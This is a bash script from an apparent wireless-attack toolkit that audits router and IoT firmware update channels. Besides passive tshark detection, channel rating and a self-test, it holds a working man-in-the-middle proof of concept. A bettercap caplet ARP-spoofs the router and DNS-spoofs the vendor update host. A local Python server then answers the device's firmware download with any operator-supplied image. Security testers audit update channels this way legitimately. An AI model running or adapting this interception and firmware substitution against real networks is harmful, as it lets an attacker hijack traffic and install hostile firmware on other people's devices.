#!/usr/bin/env bash
# 27b_fw_update_audit.sh — firmware update channel audit + PoC
#
#   --detect-updates IFACE
#   --verify-channel URL
#   --start-poc-mitm ROUTER_IP IFACE HOST [log|original|canary] [IMAGE] [PORT]
#   --stop-poc-mitm
#   --inject-canary SRC DST

# (set -euo pipefail moved to standalone guard)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="${WIFISTING_ROOT:-$(dirname "$SCRIPT_DIR")}"
LOOT_DIR="${PROJECT_DIR}/loot/firmware"
POC_TMP=/tmp/wifisting/fw-poc
POC_PID_FILE=/tmp/wifisting/fw-poc.pid

# ---------------------------------------------------------------- #
#  Detection                                                       #
# ---------------------------------------------------------------- #

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

cmd_detect_updates() {
    local iface="${1:-}"
    [ -n "$iface" ] || { echo "ERROR	interface required" >&2; exit 1; }

    exec stdbuf -oL tshark -i "$iface" -l -n -Q \
        -Y '(http.request.method == "GET" and (http.request.uri matches "(?i)(firmware|update|upgrade|ota|\\.(bin|img|trx|chk|hex|fw)$)")) or tftp.type == 1 or (dns.flags.response == 0 and dns.qry.name matches "(?i)(firmware|update|ota|upgrade)\\.") or (tls.handshake.extensions_server_name matches "(?i)(firmware|update|ota|upgrade)\\.")' \
        -T fields -E separator=$'\t' \
        -e frame.time_epoch \
        -e ip.src \
        -e ip.dst \
        -e _ws.col.Protocol \
        -e http.host \
        -e http.request.uri \
        -e tls.handshake.extensions_server_name \
        -e dns.qry.name \
        -e tftp.source_file \
        2>/dev/null | awk -F'\t' 'BEGIN{OFS="\t"} {
            ts=$1; src=$2; dst=$3; proto=$4; host=$5; uri=$6; sni=$7; dns=$8; tftp=$9
            h = (host != "") ? host : ((sni != "") ? sni : ((dns != "") ? dns : "-"))
            p = (uri  != "") ? uri  : ((tftp != "") ? tftp : "-")
            if (h == "-" && p == "-") next
            print "UPDATE", int(ts), src, dst, proto, h, p
        }'
}

# ---------------------------------------------------------------- #
#  Verification                                                    #
# ---------------------------------------------------------------- #

cmd_verify_channel() {
    local url="${1:-}"
    [ -n "$url" ] || { echo "ERROR	URL required" >&2; exit 1; }

    local proto="UNKNOWN" rest="$url"
    case "$url" in
        http://*)  proto="HTTP";  rest="${url#http://}"  ;;
        https://*) proto="HTTPS"; rest="${url#https://}" ;;
        tftp://*)  proto="TFTP";  rest="${url#tftp://}"  ;;
    esac

    local host="${rest%%/*}"
    local path="/"
    [ "$host" != "$rest" ] && path="/${rest#*/}"

    local tv td
    case "$proto" in
        HTTP)  tv="critical"; td="Plain HTTP, no TLS — trivially interceptable" ;;
        TFTP)  tv="critical"; td="UDP TFTP — no encryption, no authentication" ;;
        HTTPS)
            local cert_info
            # openssl writes the peer chain and the "Verify return code:"
            # summary to STDOUT, and its diagnostics (connection refused, DNS
            # failure, no such binary) to STDERR. Capture stdout only: with
            # 2>&1 every failure produced a non-empty string, so the
            # "handshake failed" branch below could never be reached and an
            # unreachable host was reported as "TLS chain not trusted".
            cert_info=$(echo | timeout 6 openssl s_client -connect "${host}:443" \
                        -servername "${host}" 2>/dev/null || true)
            if [ -z "$cert_info" ]; then
                tv="medium";  td="TLS handshake failed or host unreachable"
            elif echo "$cert_info" | grep -q "Verify return code: 0 (ok)"; then
                tv="medium";  td="Valid TLS chain"
            elif echo "$cert_info" | grep -qi "self.signed\|self signed"; then
                tv="high";    td="Self-signed certificate — MITM-able with spoofed cert"
            else
                tv="high";    td="TLS chain not trusted"
            fi ;;
        *)     tv="unknown";  td="Unrecognized URL scheme" ;;
    esac
    printf 'TRANSPORT\t%s\t%s\t%s\n' "$proto" "$tv" "$td"

    local sv="not_found" sd="No signature channel for ${proto}"
    if [ "$proto" = "HTTP" ] || [ "$proto" = "HTTPS" ]; then
        if command -v curl >/dev/null 2>&1; then
            local sig_url="${url}.sig" code
            code=$(curl -sk -o /dev/null --max-time 6 -w "%{http_code}" -I "$sig_url" || echo "000")
            if [ "$code" = "200" ]; then
                sv="found";     sd=".sig served at ${sig_url}"
            else
                sv="not_found"; sd="No .sig file at ${sig_url} (HTTP ${code})"
            fi
        else
            sv="unknown";  sd="curl not installed — cannot probe for signature"
        fi
    fi
    printf 'SIGNATURE\t%s\t%s\t%s\n' "$sv" "$sv" "$sd"

    local dv="no_verify" dd="No signature-verifying binaries found in extracted images"
    if [ -d "${LOOT_DIR}/samples" ]; then
        local hit
        hit=$(grep -rlE -m1 \
            '(fw[_-]verify|mtd[_-]verify|mtdsig|rsa[_-]verify|image[_-]verify|firmware[_-]verify)' \
            "${LOOT_DIR}/samples" 2>/dev/null | head -1 || true)
        if [ -n "$hit" ]; then
            dv="verify"
            dd="Verification reference found in ${hit##*/samples/}"
        fi
    fi
    printf 'DEVICE\t%s\t%s\t%s\n' "$dv" "$dv" "$dd"

    local verdict="medium" summary="Mixed signals — manual inspection recommended"
    if [ "$tv" = "critical" ] && [ "$sv" = "not_found" ]; then
        verdict="critical"
        summary="Hijackable over the air without physical access"
    elif [ "$tv" = "high" ]; then
        verdict="high"
        summary="Weak or unverified transport — likely hijackable"
    elif [ "$sv" = "found" ] && [ "$dv" = "verify" ]; then
        verdict="safe"
        summary="Transport and device both verify firmware"
    fi
    printf 'VERDICT\t%s\t%s\t%s\n' "$verdict" "$verdict" "$summary"
}

# ---------------------------------------------------------------- #
#  PoC — redirect and serve                                        #
# ---------------------------------------------------------------- #

cmd_stop_poc() {
    local killed=0 p=""
    [ -f "$POC_PID_FILE" ] && p=$(cat "$POC_PID_FILE" 2>/dev/null || true)
    if [ -n "$p" ]; then
        stop_kill_pid "$p" && killed=1
    fi
    stop_sweep 'bettercap.*fw-poc\.cap' && killed=1
    stop_sweep 'fw-poc-server\.py' && killed=1

    if (( killed == 1 )); then
        rm -f "$POC_PID_FILE"
        echo "STOPPED"
        return 0
    fi
    if [ -n "$p" ]; then
        echo "ERR poc pid $p survived SIGKILL (pidfile kept)" >&2
        return 1
    fi
    echo "STOPPED"
}

cmd_start_poc() {
    local router_ip="${1:-}"
    local iface="${2:-}"
    local hostname="${3:-}"
    local mode="${4:-log}"
    local image_src="${5:-}"
    local port="${6:-80}"

    [ -n "$router_ip" ] || { printf 'ERROR\trouter IP required\n'; exit 1; }
    [ -n "$iface" ]     || { printf 'ERROR\tinterface required\n'; exit 1; }
    [ -n "$hostname" ]  || { printf 'ERROR\tvendor hostname required\n'; exit 1; }

    cmd_stop_poc >/dev/null
    mkdir -p "$POC_TMP/serve"

    local our_ip
    our_ip=$(ip -4 addr show "$iface" 2>/dev/null \
             | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
    if [ -z "$our_ip" ]; then
        printf 'ERROR\tno IPv4 address on %s — bring the interface up first\n' "$iface"
        exit 1
    fi

    if [ "$mode" != "log" ]; then
        if [ -z "$image_src" ] || [ ! -f "$image_src" ]; then
            printf 'ERROR\timage file required for mode %s\n' "$mode"
            exit 1
        fi
        cp "$image_src" "$POC_TMP/serve/image.bin"
        if [ "$mode" = "canary" ]; then
            printf '\nWIFISTING-CANARY-%s\n' "$(date +%s)" >> "$POC_TMP/serve/image.bin"
            printf 'CANARY\tmarker appended to image\n'
        fi
        printf 'IMAGE\t%s bytes prepared\n' "$(stat -c %s "$POC_TMP/serve/image.bin")"
    fi

    local caplet="/tmp/wifisting/fw-poc.cap"
    mkdir -p /tmp/wifisting
    cat > "$caplet" <<CAP_EOF
set arp.spoof.targets $router_ip
set arp.spoof.fullduplex true
set arp.spoof.internal true
set dns.spoof.domains $hostname
set dns.spoof.address $our_ip
set dns.spoof.all false
events.stream.output /dev/null
arp.spoof on
dns.spoof on
CAP_EOF

    printf 'MITM_STARTED\t%s\trouter=%s\thost=%s\tmode=%s\n' \
        "$our_ip" "$router_ip" "$hostname" "$mode"

    bettercap -iface "$iface" -caplet "$caplet" >/dev/null 2>&1 &
    local bc_pid=$!
    echo "$bc_pid" > "$POC_PID_FILE"

    cat > "$POC_TMP/fw-poc-server.py" << 'PY_EOF'
#!/usr/bin/env python3
import http.server, os, sys, time

image_dir = sys.argv[1]
port      = int(sys.argv[2])
mode      = sys.argv[3]

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        ts     = int(time.time())
        client = self.client_address[0]
        path   = self.path
        img    = os.path.join(image_dir, "image.bin")
        serve  = (mode != "log") and os.path.exists(img)

        if serve:
            size = os.path.getsize(img)
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(size))
            self.send_header('Server', 'lighttpd/1.4.45')
            self.end_headers()
            with open(img, 'rb') as f:
                while True:
                    c = f.read(65536)
                    if not c: break
                    self.wfile.write(c)
            print(f"FETCH\t{ts}\t{client}\t{path}\t200\t{size}", flush=True)
        else:
            self.send_response(404)
            self.send_header('Content-Length', '0')
            self.send_header('Server', 'lighttpd/1.4.45')
            self.end_headers()
            print(f"FETCH\t{ts}\t{client}\t{path}\t404\t0", flush=True)

class T(http.server.ThreadingHTTPServer):
    allow_reuse_address = True

with T(("0.0.0.0", port), H) as httpd:
    print(f"READY\tport={port}\tmode={mode}", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
PY_EOF
    chmod +x "$POC_TMP/fw-poc-server.py"

    python3 "$POC_TMP/fw-poc-server.py" "$POC_TMP/serve" "$port" "$mode" &
    local py_pid=$!

    trap 'kill '"$py_pid"' '"$bc_pid"' 2>/dev/null; rm -f '"$POC_PID_FILE"'' \
        EXIT INT TERM

    wait "$py_pid"
}

cmd_inject_canary() {
    local src="${1:-}" dst="${2:-}"
    [ -f "$src" ] || { printf 'ERROR\tsource not found\n'; exit 1; }
    [ -n "$dst" ] || { printf 'ERROR\tdestination required\n'; exit 1; }
    # `cp file file` fails silently, and the append below then marked up the
    # SOURCE image. Refuse when both paths resolve to the same file.
    local rsrc rdst
    rsrc=$(readlink -f -- "$src" 2>/dev/null); rsrc="${rsrc:-$src}"
    rdst=$(readlink -f -- "$dst" 2>/dev/null); rdst="${rdst:-$dst}"
    if [ "$rsrc" = "$rdst" ]; then
        printf 'ERROR\tsource and destination are the same file: %s\n' "$src" >&2
        exit 1
    fi
    cp "$src" "$dst"
    printf '\nWIFISTING-CANARY-%s\n' "$(date +%s)" >> "$dst"
    printf 'CANARY\twrote %s (%s bytes)\n' "$dst" "$(stat -c %s "$dst")"
}

# ---------------------------------------------------------------- #
#  Self-test                                                       #
# ---------------------------------------------------------------- #

# Offline: URL scheme classification, the signature/device/verdict logic,
# canary injection and every argv guard. The HTTP/HTTPS tool probes would
# open a connection, so those are run with an empty PATH — the module's own
# "tool missing" branch — which also proves it cannot touch the network.
# The PoC start/stop paths are NOT exercised: they sweep for a running
# bettercap/poc server and would kill a real one.
#
# LOOT_DIR is redirected into scratch space so the device-verification scan
# never reads the real loot tree.
fw_update_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }
    rcount() { printf '%s\n' "$1" | grep -c . ; }

    local MOD_TMP="/tmp/wifisting/fw_update_audit/selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP/loot/samples" "$MOD_TMP/work"
    local s_loot="$LOOT_DIR"
    LOOT_DIR="$MOD_TMP/loot"
    local MOD="${BASH_SOURCE[0]}"
    local out rc

    # 1. transport classification and the TFTP verdict (no tool, no socket)
    out=$(cmd_verify_channel "tftp://192.0.2.1/fw.bin")
    chk verify-rows        "$(rcount "$out")" 4
    chk verify-fields      "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=4{c++} END{print c+0}')" 0
    chk verify-tftp-proto  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $2}')" TFTP
    chk verify-tftp-rating "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $3}')" critical
    chk verify-tftp-sig    "$(fld "$out" SIGNATURE)" not_found
    chk verify-tftp-sigmsg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="SIGNATURE"{print $4}')" \
        "No signature channel for TFTP"
    chk verify-tftp-device "$(fld "$out" DEVICE)" no_verify
    chk verify-tftp-verdict "$(fld "$out" VERDICT)" critical
    chk verify-tftp-summary "$(printf '%s\n' "$out" | awk -F'\t' '$1=="VERDICT"{print $4}')" \
        "Hijackable over the air without physical access"

    # ... an unrecognised scheme is not silently treated as safe
    out=$(cmd_verify_channel "ftp://192.0.2.1/fw.bin")
    chk verify-ftp-proto   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $2}')" UNKNOWN
    chk verify-ftp-rating  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $3}')" unknown
    chk verify-ftp-summary "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $4}')" \
        "Unrecognized URL scheme"
    chk verify-ftp-verdict "$(fld "$out" VERDICT)" medium
    chk verify-ftp-verdictmsg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="VERDICT"{print $4}')" \
        "Mixed signals — manual inspection recommended"

    # ... a URL with no path is accepted (host only)
    out=$(cmd_verify_channel "tftp://192.0.2.1")
    chk verify-nopath-verdict "$(fld "$out" VERDICT)" critical

    # ... transport detection for http/https, with an empty PATH so no
    #     probe tool exists and no connection can be attempted
    out=$(env PATH=/nonexistent "$BASH" "$MOD" --verify-channel "http://fw.example.invalid/a.bin" 2>/dev/null)
    chk verify-http-proto  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $2}')" HTTP
    chk verify-http-rating "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $3}')" critical
    chk verify-http-probe-honest "$(fld "$out" SIGNATURE)" unknown
    chk verify-http-probe-msg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="SIGNATURE"{print $4}')" \
        "curl not installed — cannot probe for signature"
    out=$(env PATH=/nonexistent "$BASH" "$MOD" --verify-channel "https://fw.example.invalid/a.bin" 2>/dev/null)
    chk verify-https-proto  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $2}')" HTTPS
    # With no TLS tooling the handshake genuinely cannot happen, so this now
    # takes the "handshake failed" branch. It used to be unreachable because
    # cert_info absorbed openssl's stderr, so every failure was reported as
    # the much more alarming "TLS chain not trusted".
    chk verify-https-rating "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $3}')" medium
    chk verify-https-msg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="TRANSPORT"{print $4}')" \
        "TLS handshake failed or host unreachable"
    chk verify-https-fields "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=4{c++} END{print c+0}')" 0

    # 2. device verification detector reads the extracted samples tree
    printf 'fw_verify_image() { return 0; }\n' > "$LOOT_DIR/samples/libfwupgrade.so"
    out=$(cmd_verify_channel "tftp://192.0.2.1/fw.bin")
    chk verify-device-hit   "$(fld "$out" DEVICE)" verify
    chk verify-device-name  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DEVICE"{print $4}')" \
        "Verification reference found in libfwupgrade.so"
    chk verify-device-norescue "$(fld "$out" VERDICT)" critical
    rm -f "$LOOT_DIR/samples/libfwupgrade.so"
    rmdir "$LOOT_DIR/samples" 2>/dev/null
    out=$(cmd_verify_channel "tftp://192.0.2.1/fw.bin")
    chk verify-device-nodir "$(fld "$out" DEVICE)" no_verify

    # 3. canary injection
    printf 'FIRMWARE-IMAGE-DATA\n' > "$MOD_TMP/work/orig.bin"
    local orig_size; orig_size=$(stat -c %s "$MOD_TMP/work/orig.bin")
    out=$(cmd_inject_canary "$MOD_TMP/work/orig.bin" "$MOD_TMP/work/canary.bin"); rc=$?
    chk canary-rc      "$rc" 0
    chk canary-says    "$(printf '%s\n' "$out" | cut -f1)" CANARY
    chk canary-bytes   "$(printf '%s\n' "$out" | awk -F'\t' '{print ($2 ~ /^wrote /) ? "ok" : "bad"}')" ok
    chk canary-copied  "$(head -1 "$MOD_TMP/work/canary.bin")" FIRMWARE-IMAGE-DATA
    chk canary-marker  "$(grep -c '^WIFISTING-CANARY-[0-9][0-9]*$' "$MOD_TMP/work/canary.bin")" 1
    chk canary-appended "$(stat -c %s "$MOD_TMP/work/canary.bin" | awk -v o="$orig_size" '{print ($1>o)?"bigger":"not"}')" bigger
    chk canary-src-intact "$(stat -c %s "$MOD_TMP/work/orig.bin")" "$orig_size"
    chk canary-src-unmarked "$(grep -c 'WIFISTING-CANARY' "$MOD_TMP/work/orig.bin")" 0
    cmd_inject_canary "$MOD_TMP/work/orig.bin" "$MOD_TMP/work/canary.bin" >/dev/null
    chk canary-no-accumulate "$(grep -c 'WIFISTING-CANARY' "$MOD_TMP/work/canary.bin")" 1
    # ... the same path twice must be refused: `cp file file` fails, and the
    # append would otherwise canary the SOURCE image.
    out=$(cmd_inject_canary "$MOD_TMP/work/orig.bin" "$MOD_TMP/work/orig.bin" 2>&1); rc=$?
    chk canary-samefile-rc      "$rc" 1
    chk canary-samefile-msg     "$(printf '%s\n' "$out" | grep -c 'ERROR.*same file')" 1
    chk canary-samefile-nosuccess "$(printf '%s\n' "$out" | grep -c '^CANARY')" 0
    chk canary-samefile-src-intact "$(stat -c %s "$MOD_TMP/work/orig.bin")" "$orig_size"
    chk canary-samefile-unmarked "$(grep -c 'WIFISTING-CANARY' "$MOD_TMP/work/orig.bin")" 0
    # ... and the same file reached by a different spelling of the path
    out=$(cd "$MOD_TMP/work" && cmd_inject_canary "./orig.bin" "$MOD_TMP/work/orig.bin" 2>&1); rc=$?
    chk canary-samefile-relpath-rc "$rc" 1
    chk canary-samefile-relpath-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*same file')" 1

    # 4. argv guards (each one exits, so each runs in a subprocess)
    out=$(bash "$MOD" --verify-channel 2>&1); rc=$?
    chk guard-verify-no-url-rc  "$rc" 1
    chk guard-verify-no-url-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*URL required')" 1
    out=$(bash "$MOD" --detect-updates 2>&1); rc=$?
    chk guard-detect-no-iface-rc  "$rc" 1
    chk guard-detect-no-iface-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*interface required')" 1
    out=$(bash "$MOD" --inject-canary 2>&1); rc=$?
    chk guard-canary-no-src-rc  "$rc" 1
    chk guard-canary-no-src-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*source not found')" 1
    out=$(bash "$MOD" --inject-canary "$MOD_TMP/work/orig.bin" 2>&1); rc=$?
    chk guard-canary-no-dst-rc  "$rc" 1
    chk guard-canary-no-dst-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*destination required')" 1
    out=$(bash "$MOD" --start-poc-mitm 2>&1); rc=$?
    chk guard-poc-noargs-rc  "$rc" 1
    chk guard-poc-noargs-msg "$(printf '%s\n' "$out" | grep -c 'router IP required')" 1
    out=$(bash "$MOD" --start-poc-mitm 192.0.2.1 2>&1); rc=$?
    chk guard-poc-noiface-rc  "$rc" 1
    chk guard-poc-noiface-msg "$(printf '%s\n' "$out" | grep -c 'interface required')" 1
    out=$(bash "$MOD" --start-poc-mitm 192.0.2.1 wlan0 2>&1); rc=$?
    chk guard-poc-nohost-rc  "$rc" 1
    chk guard-poc-nohost-msg "$(printf '%s\n' "$out" | grep -c 'vendor hostname required')" 1
    out=$(bash "$MOD" --bogus 2>&1); rc=$?
    chk guard-usage-rc  "$rc" 2
    chk guard-usage-msg "$(printf '%s\n' "$out" | grep -c '^usage:')" 1

    LOOT_DIR="$s_loot"
    rm -rf "$MOD_TMP"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ---------------------------------------------------------------- #
#  Dispatch                                                        #
# ---------------------------------------------------------------- #

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
case "${1:-}" in
    --selftest) fw_update_selftest; exit $? ;;
    --detect-updates) shift; cmd_detect_updates "${1:-}" ;;
    --verify-channel) shift; cmd_verify_channel "${1:-}" ;;
    --start-poc-mitm)
        shift
        cmd_start_poc "${1:-}" "${2:-}" "${3:-}" "${4:-log}" "${5:-}" "${6:-80}"
        ;;
    --stop-poc-mitm) cmd_stop_poc ;;
    --inject-canary) shift; cmd_inject_canary "${1:-}" "${2:-}" ;;
    *)
        cat >&2 <<USAGE
usage:
  $0 --detect-updates IFACE
  $0 --verify-channel URL
  $0 --start-poc-mitm ROUTER_IP IFACE HOST [log|original|canary] [IMAGE] [PORT]
  $0 --stop-poc-mitm
  $0 --inject-canary SRC DST
  $0 --selftest
USAGE
        exit 2
        ;;
esac
fi

# ── interactive CLI menu (added for wifisting.sh) ──

fw_update_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== Firmware Update Channel Audit ===${C_RESET}"
        cat << 'M'

  [1]  passive detect update traffic (tshark)
  [2]  verify a channel (URL)
  [3]  start PoC MITM (log-only mode)
  [4]  start PoC MITM (serve original image)
  [5]  start PoC MITM (serve canary-modified image)
  [6]  stop PoC
  [7]  inject canary marker into an image
  [0]  back

M
        read -rp "  choice> " c
        case "$c" in
            1)
                read -rp "  interface> " i
                "${BASH_SOURCE[0]%/*}/27b_fw_update_audit.sh" --detect-updates "$i"
                ;;
            2)
                read -rp "  URL> " u
                "${BASH_SOURCE[0]%/*}/27b_fw_update_audit.sh" --verify-channel "$u"
                ;;
            3|4|5)
                read -rp "  router IP> " r
                read -rp "  interface> " i
                read -rp "  vendor hostname (e.g. fw.tplink.com)> " h
                local mode
                case "$c" in 3) mode=log ;; 4) mode=original ;; 5) mode=canary ;; esac
                local img=""
                if [[ "$mode" != "log" ]]; then
                    read -rp "  image path> " img
                fi
                read -rp "  HTTP port [80]> " p; p="${p:-80}"
                "${BASH_SOURCE[0]%/*}/27b_fw_update_audit.sh" \
                    --start-poc-mitm "$r" "$i" "$h" "$mode" "$img" "$p"
                ;;
            6) "${BASH_SOURCE[0]%/*}/27b_fw_update_audit.sh" --stop-poc-mitm ;;
            7)
                read -rp "  source image> " s
                read -rp "  destination> " d
                "${BASH_SOURCE[0]%/*}/27b_fw_update_audit.sh" --inject-canary "$s" "$d"
                ;;
            0) return ;;
            *) warn "invalid"; sleep 0.5; continue ;;
        esac
        echo ""; read -rp "  press enter " _
    done
}
